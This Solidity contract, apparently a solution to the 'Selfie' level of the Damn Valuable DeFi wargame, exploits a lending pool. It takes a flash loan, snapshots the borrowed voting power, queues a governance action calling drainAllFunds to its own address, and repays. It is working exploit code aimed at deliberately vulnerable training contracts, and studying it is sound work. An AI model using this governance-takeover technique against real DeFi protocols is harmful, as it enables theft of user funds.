// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SelfiePool} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";

contract SelfieAttacker {
    SelfiePool private  selfiePool;
    SimpleGovernance private simpleGovernance;
    DamnValuableTokenSnapshot public myToken;

    constructor(address _selfiePool, address _simpleGovernance, address _token) {
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        myToken = DamnValuableTokenSnapshot(_token);
    }

    function receiveTokens(address token, uint256 borrowAmount) public {
        myToken.snapshot();
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", address(this));
        simpleGovernance.queueAction(address(selfiePool), data, 0);

        // simpleGovernance.executeAction(actionId);

        DamnValuableTokenSnapshot(token).transfer(address(selfiePool), borrowAmount);
    }

    function withdraw() external {
        myToken.transfer(msg.sender, myToken.balanceOf(address(this)));
    }

    function attack() public {
        selfiePool.flashLoan(myToken.balanceOf(address(selfiePool)));
    }

}